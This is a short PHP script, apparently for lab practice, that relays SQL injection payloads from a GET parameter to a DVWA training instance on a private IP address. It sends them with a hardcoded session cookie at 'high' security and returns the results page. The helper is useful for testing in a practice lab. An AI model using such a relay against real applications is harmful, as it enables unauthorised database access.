<?php
/**
 * SQL Injection Test Proxy
 * 
 * This script receives an SQL injection payload via GET parameter 's',
 * URL encodes it, submits it to a target DVWA instance via POST,
 * then fetches and returns the results page.
 * 
 * Usage: access this script with ?s=[SQL injection payload]
 */

// Check if the SQL injection payload was provided
if (!isset($_GET['s'])) {
    die("Error: No SQL injection payload provided. Please supply the 's' parameter.");
}

// Configuration
$submitUrl = 'http://192.168.129.1/DVWA-1/vulnerabilities/sqli/session-input.php#';
$resultsUrl = 'http://192.168.129.1/DVWA-1/vulnerabilities/sqli';
$cookie = 'PHPSESSID=36jdcpecr86huucfq86imggkp4; security=high';

// Get and encode the SQL injection payload
$payload = $_GET['s'];
$encodedPayload = urlencode($payload);

// Prepare the POST data
$postData = "id=$encodedPayload&Submit=Submit";

// Initialize cURL session
$ch = curl_init();

// Set common cURL options
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); // Return the transfer as a string
curl_setopt($ch, CURLOPT_COOKIE, $cookie);      // Set the session cookie
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);// Disable SSL verification (for testing only)

// First request: Submit the payload via POST
curl_setopt($ch, CURLOPT_URL, $submitUrl);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, $postData);
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Content-Type: application/x-www-form-urlencoded'
]);

// Execute the POST request
$response = curl_exec($ch);

// Check for cURL errors
if (curl_errno($ch)) {
    die('cURL POST Error: ' . curl_error($ch));
}

// Second request: GET the results page
curl_setopt($ch, CURLOPT_URL, $resultsUrl);
curl_setopt($ch, CURLOPT_POST, false); // Switch back to GET
curl_setopt($ch, CURLOPT_POSTFIELDS, null); // Clear POST data

// Execute the GET request
$response = curl_exec($ch);

// Check for cURL errors
if (curl_errno($ch)) {
    die('cURL GET Error: ' . curl_error($ch));
}

// Close cURL session
curl_close($ch);

// Output the results
header('Content-Type: text/html');
echo $response;
?>